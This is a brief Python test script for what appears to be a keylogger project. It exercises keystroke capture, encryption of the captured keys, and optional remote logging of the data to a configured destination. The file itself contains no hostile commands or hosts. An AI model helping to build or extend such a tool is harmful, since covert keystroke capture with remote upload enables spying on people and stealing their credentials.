import logging
from core.logger import Keylogger
from core.data_handler import DataHandler
from config.loader import ConfigLoader

def test_local_logging():
    print("Testing local logging...")
    keylogger = Keylogger()
    keylogger._process_keystroke("TestKey")

def test_encryption():
    print("Testing encryption...")
    data_handler = DataHandler()
    data_handler.enable_encryption()
    encrypted = data_handler.encrypt_data("TestKey")
    decrypted = data_handler.decrypt_data(encrypted)
    assert decrypted == "TestKey", "Encryption/Decryption failed"
    print("Encryption/Decryption test passed.")

def test_remote_logging():
    print("Testing remote logging...")
    config = ConfigLoader.load_config()
    if config["storage"]["remote"]["enabled"]:
        data_handler = DataHandler()
        data_handler.remote_log("Test remote log")
    else:
        print("Remote logging is disabled in configuration.")

if __name__ == "__main__":
    test_local_logging()
    test_encryption()
    test_remote_logging()
